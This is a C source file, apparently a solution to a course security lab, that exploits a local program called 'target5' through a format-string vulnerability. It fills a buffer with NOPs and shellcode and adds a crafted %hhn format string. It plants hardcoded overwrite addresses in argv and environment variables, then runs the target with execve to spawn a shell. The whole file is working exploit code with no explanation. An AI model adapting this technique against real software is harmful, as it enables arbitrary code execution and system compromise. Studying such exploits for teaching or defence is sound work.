#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target5"
#define BUFSIZE 512 
#define SHELLSIZE 45
int
main ( int argc, char * argv[] )
{
	char *	args[3];
	char *	env[22];
	char attackBuffer[BUFSIZE];
	char blank[200];
	memset(blank, 0x90, 200);
	int i = 0;
	for (i = 0; i < BUFSIZE; i++){
		attackBuffer[i] = 0x90;
	}
	for (i = 0; i < SHELLSIZE; i++){
		attackBuffer[i] = shellcode[i];
	}
	char tmp [] = "|%08x|%08x|%08x|%08x|%10x|%hhn|%152x|%hhn|%168x|%hhn|%154x|%hhn";
	memcpy(&attackBuffer[SHELLSIZE + 4 - SHELLSIZE%4], tmp, strlen(tmp));
	attackBuffer[SHELLSIZE + 4 - SHELLSIZE%4 + strlen(tmp)] = '\0';
	args[0] = TARGET;
	args[1] = "\x68\xfe\xa4\x40";
	args[2] = NULL;

	env[0] = "";
	env[1] = "";
	env[2] = "";

	env[3] = "\x90\x90\x90\x90\x90\x90\x90";
	
	env[4] = "\x69\xfe\xa4\x40";
	env[5] = "";
	env[6] = "";
	env[7] = "";

	env[8] = "\x90\x90\x90\x90\x90\x90\x90";
	
	env[9] = "\x6a\xfe\xa4\x40";
	env[10] = "";
	env[11] = "";
	env[12] = "";

	env[13] = "\x90\x90\x90\x90\x90\x90\x90";
	
	env[14] = "\x6b\xfe\xa4\x40";
	env[15] = "";
	env[16] = "";
	env[17] = "";

	env[18] = "\x90\x90\x90";

	env[19] = attackBuffer;

	env[20] = blank;
	env[21] = NULL;

	if ( execve (TARGET, args, env) < 0 )
		fprintf (stderr, "execve failed.\n");

	return (0);
}
